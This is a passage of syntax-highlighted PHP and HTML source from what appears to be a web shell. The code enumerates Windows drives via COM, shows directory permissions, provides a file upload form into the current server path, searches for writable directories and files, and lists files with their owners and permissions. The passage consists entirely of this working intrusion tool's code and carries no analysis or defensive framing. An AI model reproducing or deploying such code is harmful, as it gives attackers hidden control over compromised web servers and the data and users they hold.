<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td</span> <span style="color: #f57900; font-weight: bold;">nowrap</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Current</span> <span style="color: #eeeeec; background-color: #2e3436;">Directory (</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">dir_writeable</span>;<span style="color: #729fcf;">?&gt;</span>, <span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">nowpath</span>);<span style="color: #729fcf;">?&gt;</span>)<span style="color: #8ae234;">&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td</span> <span style="color: #8ae234;">width=</span><span style="color: #ad7fa8; font-style: italic;">"100%"</span><span style="color: #8ae234;">&gt;&lt;input</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"view_writable"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"0"</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"hidden"</span> /<span style="color: #8ae234;">&gt;&lt;input</span> <span style="color: #8ae234;">class=</span><span style="color: #ad7fa8; font-style: italic;">"input"</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"dir"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"&lt;?php echo $nowpath;?&gt;"</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text"</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"width:99%;margin:0 8px;"</span>&gt;<span style="color: #8ae234;">&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;td</span> <span style="color: #f57900; font-weight: bold;">nowrap</span><span style="color: #8ae234;">&gt;&lt;input</span> <span style="color: #8ae234;">class=</span><span style="color: #ad7fa8; font-style: italic;">"bt"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"GO"</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"submit"</span><span style="color: #8ae234;">&gt;&lt;/td&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/tr&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/form&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/table&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">obj</span> = <span style="color: #729fcf; font-weight: bold;">new</span> <span style="color: #8ae234; font-weight: bold;">COM</span>(<span style="color: #ad7fa8; font-style: italic;">'scripting.filesystemobject'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">obj</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_object(</span>$<span style="color: #eeeeec;">obj</span>) &amp;&amp; $<span style="color: #eeeeec;">obj</span>-<span style="color: #8ae234;">&gt;</span><span style="color: #eeeeec;">Drives</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">DriveTypeDB</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(0</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'Unknow'</span>,<span style="color: #eeeeec; background-color: #2e3436;">1</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'Removable'</span>,<span style="color: #eeeeec; background-color: #2e3436;">2</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'Fixed'</span>,<span style="color: #eeeeec; background-color: #2e3436;">3</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'Network'</span>,<span style="color: #eeeeec; background-color: #2e3436;">4</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'CDRom'</span>,<span style="color: #eeeeec; background-color: #2e3436;">5</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'RAM Disk'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">comma</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">obj</span>-&gt;<span style="color: #eeeeec;">Drives</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">drive</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">drive</span>-&gt;<span style="color: #eeeeec;">Path</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">comma</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #eeeeec;">drive</span>-<span style="color: #8ae234;">&gt;</span><span style="color: #eeeeec;">Path</span>.<span style="color: #ad7fa8; font-style: italic;">'/\');"&gt;'</span>.$<span style="color: #eeeeec;">DriveTypeDB</span>[$<span style="color: #eeeeec;">drive</span>-&gt;<span style="color: #eeeeec;">DriveType</span>].<span style="color: #ad7fa8; font-style: italic;">'('</span>.$<span style="color: #eeeeec;">drive</span>-&gt;<span style="color: #eeeeec;">Path</span>.<span style="color: #ad7fa8; font-style: italic;">')&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">comma</span> = <span style="color: #ad7fa8; font-style: italic;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">'&lt;/div&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;/div&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">findstr</span> = $<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'findstr'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">re</span> = $<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'re'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">tbhead(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">"DOCUMENT_ROOT"</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;WebRoot&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'\',\'dir\');"&gt;Directory&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="javascript:createfile(\''</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Create File&lt;/a&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="POST"&gt;Find string in files(current folder): &lt;input class="input" name="findstr" value="'</span>.$<span style="color: #eeeeec;">findstr</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span>.$<span style="color: #eeeeec;">writabledb</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="text" /&gt;&lt;input name="dir" value="'</span>.$<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span>.($<span style="color: #eeeeec;">re</span> ? <span style="color: #ad7fa8; font-style: italic;">'checked'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).<span style="color: #ad7fa8; font-style: italic;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">view_writable</span> == <span style="color: #ad7fa8; font-style: italic;">'dir'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span> = <span style="color: #eeeeec; background-color: #2e3436;">GetWDirList(</span>$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">view_writable</span> == <span style="color: #ad7fa8; font-style: italic;">'file'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span> = <span style="color: #eeeeec; background-color: #2e3436;">GetWFileList(</span>$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">findstr</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span> = <span style="color: #eeeeec; background-color: #2e3436;">GetSFileList(</span>$<span style="color: #eeeeec;">nowpath</span>, $<span style="color: #eeeeec;">findstr</span>, $<span style="color: #eeeeec;">re</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">// </span><span style="color: #888a85;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirs</span>=@<span style="color: #eeeeec; background-color: #2e3436;">opendir(</span>$<span style="color: #eeeeec;">dir</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">file</span>=@<span style="color: #eeeeec; background-color: #2e3436;">readdir(</span>$<span style="color: #eeeeec;">dirs</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filepath</span>=$<span style="color: #eeeeec;">nowpath</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">file</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(@<span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">filepath</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]=$<span style="color: #eeeeec;">file</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>]=<span style="color: #729fcf; font-weight: bold;">@date</span>(<span style="color: #ad7fa8; font-style: italic;">'Y-m-d H:i:s'</span>,<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">filepath</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirchmod'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirperm'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getUser(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>]=$<span style="color: #eeeeec;">nowpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]=$<span style="color: #eeeeec;">filepath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dirdata</span>[]=$<span style="color: #eeeeec;">dirdb</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]=$<span style="color: #eeeeec;">file</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'size'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>@<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">filepath</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>]=<span style="color: #729fcf; font-weight: bold;">@date</span>(<span style="color: #ad7fa8; font-style: italic;">'Y-m-d H:i:s'</span>,<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">filepath</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'filechmod'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getUser(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>]=$<span style="color: #eeeeec;">nowpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedb</span>[<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]=$<span style="color: #eeeeec;">filepath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[]=$<span style="color: #eeeeec;">filedb</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }<span style="color: #888a85;">// </span><span style="color: #888a85;">while</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">unset(</span>$<span style="color: #eeeeec;">dirdb</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">unset(</span>$<span style="color: #eeeeec;">filedb</span>);
